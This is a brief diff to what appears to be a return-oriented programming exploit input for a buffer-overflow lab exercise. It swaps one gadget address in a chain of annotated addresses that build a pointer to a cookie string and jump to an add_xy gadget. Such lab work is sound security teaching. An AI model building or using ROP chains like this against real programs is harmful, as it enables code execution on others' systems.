@@ -136,7 +136,7 @@ dd 19 40 00 00 00 00 00 /* movl %eax, %edx */
 13 1a 40 00 00 00 00 00 /* movl %ecx, %esi */
 
 /* Get pointer to 2 lines below this one, add it to offset to get the pointer to cookie string */
-ab 19 40 00 00 00 00 00 /* movq %rsp, %rax */
+06 1a 40 00 00 00 00 00 /* movq %rsp, %rax */
 a2 19 40 00 00 00 00 00 /* movq %rax, %rdi */
 d6 19 40 00 00 00 00 00 /* goto add_xy */
 
